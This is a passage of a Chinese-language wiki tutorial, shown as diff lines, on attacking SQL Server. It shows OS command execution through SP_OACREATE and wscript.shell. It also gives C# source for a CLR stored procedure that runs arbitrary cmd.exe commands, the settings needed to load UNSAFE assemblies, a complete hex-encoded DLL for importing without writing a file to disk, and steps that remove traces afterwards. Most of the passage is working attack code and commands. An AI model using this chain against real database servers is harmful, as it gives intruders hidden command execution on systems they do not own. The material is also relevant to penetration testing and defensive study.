+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select count(*) from master.dbo.sysobjects where xtype=&#x27;x&#x27; and name=&#x27;SP_OACREATE&#x27;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/wiki/%E6%95%B0%E6%8D%AE%E5%BA%93%E5%AE%89%E5%85%A8/SQL%20Server/SQL-Server%E6%95%B0%E6%8D%AE%E5%BA%93%E6%94%BB%E9%98%B2%E8%AF%A6%E8%A7%A3%E4%B8%8A%E7%AF%87/%E6%95%B0%E6%8D%AE%E5%BA%93%E6%94%BB%E5%87%BB-27.png"></p>
+<h3 id="启用SP-OACREATE"><a href="#启用SP-OACREATE" class="headerlink" title="启用SP_OACREATE"></a>启用SP_OACREATE</h3><p>利用sp_configure存储过程，启用SP_OACREATE</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">exec sp_configure &#x27;show advanced options&#x27;, 1; RECONFIGURE WITH OVERRIDE;   </span><br><span class="line">exec sp_configure &#x27;Ole Automation Procedures&#x27;, 1; RECONFIGURE WITH OVERRIDE;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/wiki/%E6%95%B0%E6%8D%AE%E5%BA%93%E5%AE%89%E5%85%A8/SQL%20Server/SQL-Server%E6%95%B0%E6%8D%AE%E5%BA%93%E6%94%BB%E9%98%B2%E8%AF%A6%E8%A7%A3%E4%B8%8A%E7%AF%87/%E6%95%B0%E6%8D%AE%E5%BA%93%E6%94%BB%E5%87%BB-28.png"></p>
+<h3 id="利用SP-OACREATE执行命令"><a href="#利用SP-OACREATE执行命令" class="headerlink" title="利用SP_OACREATE执行命令"></a>利用SP_OACREATE执行命令</h3><p>利用SP_OACREATE执行系统命令</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">declare @shell int exec sp_oacreate &#x27;wscript.shell&#x27;,@shell output exec sp_oamethod @shell,&#x27;run&#x27;,null,&#x27;C:\Windows\System32\cmd.exe /c whoami /all &gt;C:\\test\test.txt&#x27;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/wiki/%E6%95%B0%E6%8D%AE%E5%BA%93%E5%AE%89%E5%85%A8/SQL%20Server/SQL-Server%E6%95%B0%E6%8D%AE%E5%BA%93%E6%94%BB%E9%98%B2%E8%AF%A6%E8%A7%A3%E4%B8%8A%E7%AF%87/%E6%95%B0%E6%8D%AE%E5%BA%93%E6%94%BB%E5%87%BB-29.png"></p>
+<h2 id="SQL-Server-CLR相关利用"><a href="#SQL-Server-CLR相关利用" class="headerlink" title="SQL Server CLR相关利用"></a>SQL Server CLR相关利用</h2><p>CLR微软官方把他称为公共语言运行时，从 SQL Server 2005 (9.x) 开始，SQL Server 集成了用于 Microsoft Windows 的 .NET Framework 的公共语言运行时 (CLR) 组件。 这意味着现在可以使用任何 .NET Framework 语言（包括 Microsoft Visual Basic .NET 和 Microsoft Visual C#）来编写存储过程、触发器、用户定义类型、用户定义函数、用户定义聚合和流式表值函数。</p>
+<p>官方链接：<a target="_blank" rel="external nofollow noopener noreferrer" href="https://docs.microsoft.com/zh-cn/sql/relational-databases/clr-integration/common-language-runtime-clr-integration-programming-concepts?view=sql-server-ver15">https://docs.microsoft.com/zh-cn/sql/relational-databases/clr-integration/common-language-runtime-clr-integration-programming-concepts?view=sql-server-ver15</a></p>
+<p>在利用MSSQL服务实现命令执行的时候，通常的做法是利用xp_cmdshell存储过程在MSSQL进程的上下文中运行操作系统命令。如果要想利用这种技术运行自定义代码，通常需要使用LOLBINS，添加新的操作系统用户，或通过BCP向磁盘中写入二进制文件，这些方法的缺点是很容易被发现。CLR方式可以利用16进制文件流方式导入DLL文件，这样不需要文件落地。</p>
+<h3 id="创建CLR"><a href="#创建CLR" class="headerlink" title="创建CLR"></a>创建CLR</h3><p>利用VS创建MSSQL数据库项目</p>
+<p><img src="/wiki/%E6%95%B0%E6%8D%AE%E5%BA%93%E5%AE%89%E5%85%A8/SQL%20Server/SQL-Server%E6%95%B0%E6%8D%AE%E5%BA%93%E6%94%BB%E9%98%B2%E8%AF%A6%E8%A7%A3%E4%B8%8A%E7%AF%87/%E6%95%B0%E6%8D%AE%E5%BA%93%E6%94%BB%E5%87%BB-16.png"></p>
+<p>修改目标平台和勾选创建脚本</p>
+<p><img src="/wiki/%E6%95%B0%E6%8D%AE%E5%BA%93%E5%AE%89%E5%85%A8/SQL%20Server/SQL-Server%E6%95%B0%E6%8D%AE%E5%BA%93%E6%94%BB%E9%98%B2%E8%AF%A6%E8%A7%A3%E4%B8%8A%E7%AF%87/%E6%95%B0%E6%8D%AE%E5%BA%93%E6%94%BB%E5%87%BB-18.png"></p>
+<p>在SQL Server 2005中引入了从MSSQL运行.NET代码的功能，并在后续版本中叠加了许多保护措施，来限制代码可以访问的内容。在创建.Net程序集时，会给它们指定一个权限级别，例如： </p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">CREATE ASSEMBLY SQLCLRTest  </span><br><span class="line">FROM &#x27;C:\MyDBApp\SQLCLRTest.dll&#x27;  </span><br><span class="line">WITH PERMISSION_SET = SAFE;  </span><br></pre></td></tr></table></figure>
+
+<p>其权限集有三个选项：</p>
+<p>  SAFE：基本上只将MSSQL数据集暴露给代码，其他大部分操作则都被禁止。</p>
+<p>  EXTERNAL_ACCESS：允许访问底层服务器上某些资源，但不应该允许直接执行代码。</p>
+<p>  UNSAFE：允许使用任何代码。</p>
+<p>微软关于SQL CLR的详细文档可通过以下地址获得： <a target="_blank" rel="external nofollow noopener noreferrer" href="https://docs.microsoft.com/en-us/dotnet/framework/data/adonet/sql/introduction-to-sql-server-clr-integration">https://docs.microsoft.com/en-us/dotnet/framework/data/adonet/sql/introduction-to-sql-server-clr-integration</a></p>
+<p>修改目标框架和权限级别为UNSAFE。</p>
+<p><img src="/wiki/%E6%95%B0%E6%8D%AE%E5%BA%93%E5%AE%89%E5%85%A8/SQL%20Server/SQL-Server%E6%95%B0%E6%8D%AE%E5%BA%93%E6%94%BB%E9%98%B2%E8%AF%A6%E8%A7%A3%E4%B8%8A%E7%AF%87/%E6%95%B0%E6%8D%AE%E5%BA%93%E6%94%BB%E5%87%BB-19.png"></p>
+<p>创建SQL CLR C# 存储过程</p>
+<p><img src="/wiki/%E6%95%B0%E6%8D%AE%E5%BA%93%E5%AE%89%E5%85%A8/SQL%20Server/SQL-Server%E6%95%B0%E6%8D%AE%E5%BA%93%E6%94%BB%E9%98%B2%E8%AF%A6%E8%A7%A3%E4%B8%8A%E7%AF%87/%E6%95%B0%E6%8D%AE%E5%BA%93%E6%94%BB%E5%87%BB-20.png"></p>
+<p>写入代码</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line">using System;</span><br><span class="line">using System.Data;</span><br><span class="line">using System.Data.SqlClient;</span><br><span class="line">using System.Data.SqlTypes;</span><br><span class="line">using System.Diagnostics;</span><br><span class="line">using System.Text;</span><br><span class="line">using Microsoft.SqlServer.Server;</span><br><span class="line"></span><br><span class="line">public partial class StoredProcedures</span><br><span class="line">&#123;</span><br><span class="line">    [Microsoft.SqlServer.Server.SqlProcedure]</span><br><span class="line">    public static void ExecCommand (string cmd)</span><br><span class="line">    &#123;</span><br><span class="line">        // 在此处放置代码</span><br><span class="line">        SqlContext.Pipe.Send(&quot;Command is running, please wait.&quot;);</span><br><span class="line">        SqlContext.Pipe.Send(RunCommand(&quot;cmd.exe&quot;, &quot; /c &quot; + cmd));</span><br><span class="line">    &#125;</span><br><span class="line">    public static string RunCommand(string filename,string arguments)</span><br><span class="line">    &#123;</span><br><span class="line">        var process = new Process();</span><br><span class="line"></span><br><span class="line">        process.StartInfo.FileName = filename;</span><br><span class="line">        if (!string.IsNullOrEmpty(arguments))</span><br><span class="line">        &#123;</span><br><span class="line">            process.StartInfo.Arguments = arguments;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        process.StartInfo.CreateNoWindow = true;</span><br><span class="line">        process.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;</span><br><span class="line">        process.StartInfo.UseShellExecute = false;</span><br><span class="line"></span><br><span class="line">        process.StartInfo.RedirectStandardError = true;</span><br><span class="line">        process.StartInfo.RedirectStandardOutput = true;</span><br><span class="line">        var stdOutput = new StringBuilder();</span><br><span class="line">        process.OutputDataReceived += (sender, args) =&gt; stdOutput.AppendLine(args.Data);</span><br><span class="line">        string stdError = null;</span><br><span class="line">        try</span><br><span class="line">        &#123;</span><br><span class="line">            process.Start();</span><br><span class="line">            process.BeginOutputReadLine();</span><br><span class="line">            stdError = process.StandardError.ReadToEnd();</span><br><span class="line">            process.WaitForExit();</span><br><span class="line">        &#125;</span><br><span class="line">        catch (Exception e)</span><br><span class="line">        &#123;</span><br><span class="line">            SqlContext.Pipe.Send(e.Message);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        if (process.ExitCode == 0)</span><br><span class="line">        &#123;</span><br><span class="line">            SqlContext.Pipe.Send(stdOutput.ToString());</span><br><span class="line">        &#125;</span><br><span class="line">        else</span><br><span class="line">        &#123;</span><br><span class="line">            var message = new StringBuilder();</span><br><span class="line"></span><br><span class="line">            if (!string.IsNullOrEmpty(stdError))</span><br><span class="line">            &#123;</span><br><span class="line">                message.AppendLine(stdError);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            if (stdOutput.Length != 0)</span><br><span class="line">            &#123;</span><br><span class="line">                message.AppendLine(&quot;Std output:&quot;);</span><br><span class="line">                message.AppendLine(stdOutput.ToString());</span><br><span class="line">            &#125;</span><br><span class="line">            SqlContext.Pipe.Send(filename + arguments + &quot; finished with exit code = &quot; + process.ExitCode + &quot;: &quot; + message);</span><br><span class="line">        &#125;</span><br><span class="line">        return stdOutput.ToString();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/wiki/%E6%95%B0%E6%8D%AE%E5%BA%93%E5%AE%89%E5%85%A8/SQL%20Server/SQL-Server%E6%95%B0%E6%8D%AE%E5%BA%93%E6%94%BB%E9%98%B2%E8%AF%A6%E8%A7%A3%E4%B8%8A%E7%AF%87/%E6%95%B0%E6%8D%AE%E5%BA%93%E6%94%BB%E5%87%BB-21.png"></p>
+<p>编译生成DLL文件。</p>
+<p><img src="/wiki/%E6%95%B0%E6%8D%AE%E5%BA%93%E5%AE%89%E5%85%A8/SQL%20Server/SQL-Server%E6%95%B0%E6%8D%AE%E5%BA%93%E6%94%BB%E9%98%B2%E8%AF%A6%E8%A7%A3%E4%B8%8A%E7%AF%87/%E6%95%B0%E6%8D%AE%E5%BA%93%E6%94%BB%E5%87%BB-30.png"></p>
+<p>运行权限级别为“SAFE”的代码，只需启用CLR就可以了；但是，要想运行权限级别为“EXTERNAL_ACCESS”或“UNSAFE”的代码，则需要需要修改相应的配置，以及DBA权限。2017年之前和之后的服务器版本，运行标记为“UNSAFE”的CLR所需步骤是不同的，下面分别进行介绍： </p>
+<p><strong>对于SQL Server 2017之前的版本</strong></p>
+<p>显示高级选项： </p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sp_configure &#x27;show advanced options&#x27;,1;RECONFIGURE</span><br></pre></td></tr></table></figure>
+
+<p><img src="/wiki/%E6%95%B0%E6%8D%AE%E5%BA%93%E5%AE%89%E5%85%A8/SQL%20Server/SQL-Server%E6%95%B0%E6%8D%AE%E5%BA%93%E6%94%BB%E9%98%B2%E8%AF%A6%E8%A7%A3%E4%B8%8A%E7%AF%87/%E6%95%B0%E6%8D%AE%E5%BA%93%E6%94%BB%E5%87%BB-31.png"></p>
+<p>启用CLR： </p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sp_configure &#x27;clr enabled&#x27;,1;RECONFIGURE;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/wiki/%E6%95%B0%E6%8D%AE%E5%BA%93%E5%AE%89%E5%85%A8/SQL%20Server/SQL-Server%E6%95%B0%E6%8D%AE%E5%BA%93%E6%94%BB%E9%98%B2%E8%AF%A6%E8%A7%A3%E4%B8%8A%E7%AF%87/%E6%95%B0%E6%8D%AE%E5%BA%93%E6%94%BB%E5%87%BB-32.png"></p>
+<p>将存储.Net程序集的数据库配置为可信赖的。 </p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ALTER DATABASE master SET TRUSTWORTHY ON;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/wiki/%E6%95%B0%E6%8D%AE%E5%BA%93%E5%AE%89%E5%85%A8/SQL%20Server/SQL-Server%E6%95%B0%E6%8D%AE%E5%BA%93%E6%94%BB%E9%98%B2%E8%AF%A6%E8%A7%A3%E4%B8%8A%E7%AF%87/%E6%95%B0%E6%8D%AE%E5%BA%93%E6%94%BB%E5%87%BB-33.png"></p>
+<p><strong>SQL Server 2017及更高版本</strong></p>
+<p>对于SQL Server 2017及更高版本，则引入了严格的安全性，也必须禁用。另外，也可以根据提供的SHA512哈希值，针对单个程序集授予其UNSAFE权限，而不是将整个数据库都标记为可信的。对于SQL Server 2017及以上版本，如下所示：</p>
+<p>显示高级选项： </p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sp_configure &#x27;show advanced options&#x27;,1;RECONFIGURE</span><br></pre></td></tr></table></figure>
+
+<p>启用CLR： </p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sp_configure &#x27;clr enabled&#x27;,1;RECONFIGURE;</span><br></pre></td></tr></table></figure>
+
+<p>将某程序集的SHA512哈希值添加到可信程序集列表中： </p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sp_add_trusted_assembly @hash= &lt;SHA512 of DLL&gt;;</span><br></pre></td></tr></table></figure>
+
+<p>从现在开始，程序集的创建和调用对于任何SQL Server版本来说，都是一样的。</p>
+<p>通过十六进制字符串创建程序集——如果可以从十六进制字符串创建程序集，则意味着无需创建一个二进制文件并将其写入SQL服务器进程可访问的位置： </p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">CREATE ASSEMBLY clrassem from &lt;HEX STRING&gt; WITH PERMISSION_SET = UNSAFE;</span><br></pre></td></tr></table></figure>
+
+<p>创建存储过程，以从程序集运行代码： </p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">CREATE PROCEDURE debugrun AS EXTERNAL NAME clrassem.StoredProcedures.runner;</span><br></pre></td></tr></table></figure>
+
+<p>运行该存储过程： </p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">debugrun</span><br></pre></td></tr></table></figure>
+
+<p>在代码运行后，可以删除存储过程、程序集以及受信任的哈希值，并将前面修改的安全设置恢复原值。下面显示了一个完成该任务的SQL查询示例</p>
+<p>对于SQL Server 2017及更高版本： </p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sp_drop_trusted_assembly @hash=&lt;SHA512 of DLL&gt;</span><br></pre></td></tr></table></figure>
+
+<p>对于SQL Server 2017之前的版本： </p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ALTER DATABASE &lt;CONNECTED DATABASE&gt; SET TRUSTWORTHY OFF;</span><br></pre></td></tr></table></figure>
+
+<p>对于所有版本： </p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">DROP PROCEDURE debugrun;</span><br><span class="line">DROP ASSEMBLY clrassem;</span><br><span class="line">sp_configure &#x27;clr strict security&#x27;,1;RECONFIGURE</span><br><span class="line">sp_configure &#x27;show advanced options&#x27;,0;RECONFIGURE</span><br></pre></td></tr></table></figure>
+
+<h3 id="利用SQL语句导入程序集"><a href="#利用SQL语句导入程序集" class="headerlink" title="利用SQL语句导入程序集"></a>利用SQL语句导入程序集</h3><p>现在可以利用16进制文件流方式导入DLL文件，这样不需要文件落地。</p>
+<p><img src="/wiki/%E6%95%B0%E6%8D%AE%E5%BA%93%E5%AE%89%E5%85%A8/SQL%20Server/SQL-Server%E6%95%B0%E6%8D%AE%E5%BA%93%E6%94%BB%E9%98%B2%E8%AF%A6%E8%A7%A3%E4%B8%8A%E7%AF%87/%E6%95%B0%E6%8D%AE%E5%BA%93%E6%94%BB%E5%87%BB-30.png"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">CREATE ASSEMBLY [Database1]</span><br><span class="line">    AUTHORIZATION [dbo]</span><br><span class="line">    FROM 0x4D5A90000300000004000000FFFF0000B800000000000000400000000000000000000000000000000000000000000000000000000000000000000000800000000E1FBA0E00B409CD21B8014CCD21546869732070726F6772616D2063616E6E6F742062652072756E20696E20444F53206D6F64652E0D0D0A2400000000000000504500004C0103006E587C5E0000000000000000E00022200B013000000E00000006000000000000522C0000002000000040000000000010002000000002000004000000000000000400000000000000008000000002000000000000030040850000100000100000000010000010000000000000100000000000000000000000002C00004F00000000400000A802000000000000000000000000000000000000006000000C000000C82A00001C0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000200000080000000000000000000000082000004800000000000000000000002E74657874000000580C000000200000000E000000020000000000000000000000000000200000602E72737263000000A8020000004000000004000000100000000000000000000000000000400000402E72656C6F6300000C0000000060000000020000001400000000000000000000000000004000004200000000000000000000000000000000342C00000000000048000000020005007C2200004C0800000100000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000CA00280600000A72010000706F0700000A00280600000A7243000070725300007002280800000A28020000066F0700000A002A001B300600BC0100000100001173040000060A00730900000A0B076F0A00000A026F0B00000A0003280C00000A16FE010D092C0F00076F0A00000A036F0D00000A0000076F0A00000A176F0E00000A00076F0A00000A176F0F00000A00076F0A00000A166F1000000A00076F0A00000A176F1100000A00076F0A00000A176F1200000A0006731300000A7D010000040706FE0605000006731400000A6F1500000A00140C00076F1600000A26076F1700000A00076F1800000A6F1900000A0C076F1A00000A0000DE18130400280600000A11046F1B00000A6F0700000A0000DE00076F1C00000A16FE01130511052C1D00280600000A067B010000046F1D00000A6F0700000A000038AA00000000731300000A130608280C00000A16FE01130711072C0B001106086F1E00000A2600067B010000046F1F00000A16FE03130811082C22001106725D0000706F1E00000A261106067B010000046F1D00000A6F1E00000A2600280600000A1C8D0E000001251602A2251703A225187275000070A22519076F1C00000A13091209282000000AA2251A72AD000070A2251B1106252D0426142B056F1D00000AA2282100000A6F0700000A0000067B010000046F1D00000A130A2B00110A2A011000000000970025BC0018080000012202282200000A002A4E027B01000004046F2300000A6F1E00000A262A00000042534A4201000100000000000C00000076342E302E33303331390000000005006C000000A8020000237E000014030000B403000023537472696E677300000000C8060000B4000000235553007C0700001000000023475549440000008C070000C000000023426C6F620000000000000002000001571502000902000000FA0133001600000100000014000000030000000100000005000000050000002300000005000000010000000100000003000000010000000000D60101000000000006007001BA0206009001BA0206004601A7020F00DA02000006003C03E4010A005A015A020E001503A7020600EB01E40106002C027A0306002B01BA020E00FA02A7020A0086035A020A0023015A020600C401E4010E000302A7020E00D200A7020E004102A70206001402400006002102400006003100E401000000003700000000000100010001001000E9020000150001000100030110000100000015000100040006007003790050200000000096008D007D000100842000000000960099001A0002005C22000000008618A102060004005C22000000008618A102060004006522000000008300160082000400000001007F0000000100F200000002002B03000001003A020000020010030900A10201001100A10206001900A1020A003100A10206005100A102060061001A0110006900A4001500710035031A003900A10206003900F50132007900E50015007100A403370079001D031500790091033C007900C20041007900AE013C00790087023C00790055033C004900A10206008900A1024700390068004D0039004F0353003900FB000600390075025700990083005C003900430306004100B6005C003900A90060002900C2015C0049000F0164004900CB016000A100C2015C00710035036A002900A1020600590056005C0020002300BA002E000B0089002E00130092002E001B00B10063002B00BA0020000480000000000000000000000000000000002700000004000000000000000000000070005F000000000004000000000000000000000070004A00000000000400000000000000000000007000E40100000000030002000000003C3E635F5F446973706C6179436C617373315F30003C52756E436F6D6D616E643E625F5F300044617461626173653100496E743332003C4D6F64756C653E0053797374656D2E494F0053797374656D2E44617461006765745F44617461006D73636F726C6962006164645F4F757470757444617461526563656976656400636D640052656164546F456E640045786563436F6D6D616E640052756E436F6D6D616E640053656E64006765745F45786974436F6465006765745F4D657373616765007365745F57696E646F775374796C650050726F6365737357696E646F775374796C65007365745F46696C654E616D650066696C656E616D6500426567696E4F7574707574526561644C696E6500417070656E644C696E65006765745F506970650053716C5069706500436F6D70696C657247656E6572617465644174747269627574650044656275676761626C654174747269627574650053716C50726F63656475726541747472696275746500436F6D70696C6174696F6E52656C61786174696F6E734174747269627574650052756E74696D65436F6D7061746962696C697479417474726962757465007365745F5573655368656C6C4578656375746500546F537472696E67006765745F4C656E677468004461746162617365312E646C6C0053797374656D00457863657074696F6E006765745F5374617274496E666F0050726F636573735374617274496E666F0053747265616D526561646572005465787452656164657200537472696E674275696C6465720073656E646572004461746152656365697665644576656E7448616E646C6572004D6963726F736F66742E53716C5365727665722E536572766572006765745F5374616E646172644572726F72007365745F52656469726563745374616E646172644572726F72002E63746F720053797374656D2E446961676E6F73746963730053797374656D2E52756E74696D652E436F6D70696C6572536572766963657300446562756767696E674D6F6465730053746F72656450726F63656475726573004461746152656365697665644576656E744172677300617267730050726F63657373007365745F417267756D656E747300617267756D656E747300436F6E636174004F626A6563740057616974466F7245786974005374617274007365745F52656469726563745374616E646172644F7574707574007374644F75747075740053797374656D2E546578740053716C436F6E74657874007365745F4372656174654E6F57696E646F770049734E756C6C4F72456D707479000000004143006F006D006D0061006E0064002000690073002000720075006E006E0069006E0067002C00200070006C006500610073006500200077006100690074002E00000F63006D0064002E00650078006500000920002F0063002000001753007400640020006F00750074007000750074003A0000372000660069006E00690073006800650064002000770069007400680020006500780069007400200063006F006400650020003D00200000053A0020000000593C457501949B4EAC85A8875A6084DC000420010108032000010520010111110400001235042001010E0500020E0E0E11070B120C121D0E0212210212250202080E042000123D040001020E0420010102052001011141052002011C180520010112450320000204200012490320000E0320000805200112250E0500010E1D0E08B77A5C561934E08903061225040001010E062002011C122D0801000800000000001E01000100540216577261704E6F6E457863657074696F6E5468726F777301080100070100000000040100000000000000006E587C5E00000000020000001C010000E42A0000E40C000052534453CEC8B2762812304EAEE7EF5EE4D9EC7901000000463A5C746F6F6C735F736F757263655C4461746162617365315C4461746162617365315C6F626A5C44656275675C4461746162617365312E706462000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000282C00000000000000000000422C0000002000000000000000000000000000000000000000000000342C0000000000000000000000005F436F72446C6C4D61696E006D73636F7265652E646C6C0000000000FF250020001000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000001001000000018000080000000000000000000000000000001000100000030000080000000000000000000000000000001000000000048000000584000004C02000000000000000000004C0234000000560053005F00560045005200530049004F004E005F0049004E0046004F0000000000BD04EFFE00000100000000000000000000000000000000003F000000000000000400000002000000000000000000000000000000440000000100560061007200460069006C00650049006E0066006F00000000002400040000005400720061006E0073006C006100740069006F006E00000000000000B004AC010000010053007400720069006E006700460069006C00650049006E0066006F0000008801000001003000300030003000300034006200300000002C0002000100460069006C0065004400650073006300720069007000740069006F006E000000000020000000300008000100460069006C006500560065007200730069006F006E000000000030002E0030002E0030002E00300000003C000E00010049006E007400650072006E0061006C004E0061006D00650000004400610074006100620061007300650031002E0064006C006C0000002800020001004C006500670061006C0043006F00700079007200690067006800740000002000000044000E0001004F0072006900670069006E0061006C00460069006C0065006E0061006D00650000004400610074006100620061007300650031002E0064006C006C000000340008000100500072006F006400750063007400560065007200730069006F006E00000030002E0030002E0030002E003000000038000800010041007300730065006D0062006C0079002000560065007200730069006F006E00000030002E0030002E0030002E0030000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000002000000C000000543C00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000</span><br><span class="line">    WITH PERMISSION_SET = UNSAFE;</span><br><span class="line">GO</span><br></pre></td></tr></table></figure>
+
+<p><img src="/wiki/%E6%95%B0%E6%8D%AE%E5%BA%93%E5%AE%89%E5%85%A8/SQL%20Server/SQL-Server%E6%95%B0%E6%8D%AE%E5%BA%93%E6%94%BB%E9%98%B2%E8%AF%A6%E8%A7%A3%E4%B8%8A%E7%AF%87/%E6%95%B0%E6%8D%AE%E5%BA%93%E6%94%BB%E5%87%BB-34.png"></p>
+<p>创建存储过程</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">CREATE PROCEDURE [dbo].[ExecCommand]</span><br><span class="line">@cmd NVARCHAR (MAX)</span><br><span class="line">AS EXTERNAL NAME [Database1].[StoredProcedures].[ExecCommand]</span><br><span class="line">go</span><br></pre></td></tr></table></figure>
+
+<p><img src="/wiki/%E6%95%B0%E6%8D%AE%E5%BA%93%E5%AE%89%E5%85%A8/SQL%20Server/SQL-Server%E6%95%B0%E6%8D%AE%E5%BA%93%E6%94%BB%E9%98%B2%E8%AF%A6%E8%A7%A3%E4%B8%8A%E7%AF%87/%E6%95%B0%E6%8D%AE%E5%BA%93%E6%94%BB%E5%87%BB-35.png"></p>
+<h3 id="利用CLR执行命令"><a href="#利用CLR执行命令" class="headerlink" title="利用CLR执行命令"></a>利用CLR执行命令</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">exec dbo.ExecCommand &quot;whoami /all&quot;;</span><br></pre></td></tr></table></figure>
+
